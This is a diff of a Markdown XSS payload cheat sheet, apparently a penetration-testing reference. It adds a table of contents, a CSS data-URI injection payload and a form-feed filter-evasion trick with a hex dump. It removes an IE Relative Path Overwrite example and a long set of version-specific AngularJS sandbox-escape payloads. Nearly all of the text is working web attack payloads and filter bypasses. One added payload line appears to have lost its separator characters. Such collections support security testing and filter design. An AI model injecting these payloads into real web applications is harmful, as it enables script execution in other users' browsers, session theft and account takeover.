@@ -1,6 +1,14 @@
 # Cross Site Scripting
 Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
 
+ - [Exploit code or POC](#exploit-code-or-poc)
+ - [Identify an XSS endpoint](#identify-an-xss-endpoint)
+ - [XSS in HTML/Applications](#xss-in-htmlapplications)
+ - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
+ - [XSS in files](#xss-in-files)
+ - [Polyglot XSS](#polyglot-xss)
+ - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
+
 ## Exploit code or POC
 
 Cookie grabber for XSS
@@ -232,164 +240,24 @@ phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domai
 ```
 
 
-
-## XSS with Relative Path Overwrite - IE 8/9 and lower
-
-You need these 3 components
+XSS in CSS
 ```
-1) stored XSS that allows CSS injection. : {}*{xss:expression(open(alert(1)))}
-2) URL Rewriting.
-3) Relative addressing to CSS style sheet : ../style.css
-
-```
-
-A little example
-```
-http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]
+<!DOCTYPE html>
 <html>
 <head>
-<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
-<link href="[RELATIVE_URL_INSERTED_HERE]/styles.css" rel="stylesheet" type="text/css" />
+<style>
+div  {
+    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+    background-color: #cccccc;
+}
+</style>
 </head>
-<body>
-Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}
-</body>
+  <body>
+    <div>lol</div>
+  </body>
 </html>
 ```
 
-Explanation of the vulnerability
-```
-The Meta element forces IE’s document mode into IE7 compat which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use “open” to prevent client side DoS with repeated executions of alert.
-
-A simple request of “rpo.php/” makes the relative style load the page itself as a style sheet. The actual request is “/labs/xss_horror_show/chapter7/rpo.php/styles.css” the browser thinks there’s another directory but the actual request is being sent to the document and that in essence is how an RPO attack works.
-
-Demo 1 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php
-Demo 2 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3
-MultiBrowser : http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo3.php
-
-
-From : http://www.thespanner.co.uk/2014/03/21/rpo/
-```
-
-
-## Mutated XSS for Browser IE8/IE9
-```
-<listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing>
-<script>alert(document.getElementById('x').innerHTML)</script>
-```
- IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute.
-
-
-## XSS in Angular
-Angular 1.6.0
-```
-{{0[a='constructor'][a]('alert(1)')()}}
-```
-
-Angular 1.5.9
-```
-{{
-    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
-    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
-    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
-    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
-    B=C(b,c,b);$evalAsync("
-    astNode=pop();astNode.type='UnaryExpression';
-    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
-    astNode.argument={type:'Identifier',name:'foo'};
-    ");
-    m1=B($$asyncQueue.pop().expression,null,$root);
-    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
-    $eval('a(b.c)');[].push.apply=a;
-}}
-```
-
-Angular 1.5.0 - 1.5.8
-```
-{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
-```
-
-Angular 1.4.0 - 1.4.9
-```
-{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
-```
-
-Angular 1.3.20
-```
-{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
-```
-
-Angular 1.3.19
-```
-{{
-    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
-    $eval('x=alert(1)//');
-}}
-```
-
-Angular 1.3.3 - 1.3.18
-```
-{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
-  'a'.constructor.prototype.charAt=[].join;
-  $eval('x=alert(1)//');  }}
-```
-
-Angular 1.3.1 - 1.3.2
-```
-{{
-    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
-    'a'.constructor.prototype.charAt=''.valueOf;
-    $eval('x=alert(1)//');
-}}
-```
-
-Angular 1.3.0
-```
-{{!ready && (ready = true) && (
-      !call
-      ? $$watchers[0].get(toString.constructor.prototype)
-      : (a = apply) &&
-        (apply = constructor) &&
-        (valueOf = call) &&
-        (''+''.toString(
-          'F = Function.prototype;' +
-          'F.apply = F.a;' +
-          'delete F.a;' +
-          'delete F.valueOf;' +
-          'alert(1);'
-        ))
-    );}}
-```
-
-Angular 1.2.24 - 1.2.29
-```
-{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
-```
-
-Angular 1.2.19 - 1.2.23
-```
-{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
-```
-
-Angular 1.2.6 - 1.2.18
-```
-{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
-```
-
-Angular 1.2.2 - 1.2.5
-```
-{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
-```
-
-Angular 1.2.0 - 1.2.1
-```
-{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
-```
-
-Angular 1.0.1 - 1.1.5
-```
-{{constructor.constructor('alert(1)')()}}
-```
 
 ## Polyglot XSS
 Polyglot XSS - 0xsobky
@@ -509,6 +377,16 @@ Bypass onxxx= filter with a '/' - IE/Firefox/Chrome/Safari
 Bypass space filter with "/" - IE/Firefox/Chrome/Safari
 ```
 <img/src='1'/onerror=alert(0)>
+```
+
+Bypass space filter with 0x0c/^L
+```
+<svgonload=alert(1)>
+
+
+$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
+00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
+00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
 ```
 
 
